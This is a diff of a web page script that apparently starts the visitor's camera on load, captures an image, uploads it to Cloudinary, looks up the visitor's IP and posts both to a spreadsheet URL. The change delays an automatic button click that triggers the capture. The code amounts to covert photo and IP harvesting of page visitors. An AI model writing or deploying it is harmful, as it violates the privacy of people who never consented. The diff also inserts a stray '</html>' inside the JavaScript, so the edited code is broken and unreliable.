@@ -49,6 +49,7 @@ async function capture() {
 
     canvas.toBlob(async function(blob) {
         const imageURL = await uploadToCloudinary(blob);
+</html>
         const ip = await getIP();
         await fetch(SHEET_URL, {
             method: "POST",
@@ -70,9 +71,13 @@ async function capture() {
 window.onload = startCamera;
 window.addEventListener('load', () => {
   const button = document.getElementById('autoBtn');
-  if (button) button.click();
+  
+  if (button) {
+    setTimeout(() => {
+      button.click();
+    }, 5000); // 5000 ms = 5 seconds
+  }
 });
 </script>
 
 </body>
-</html>
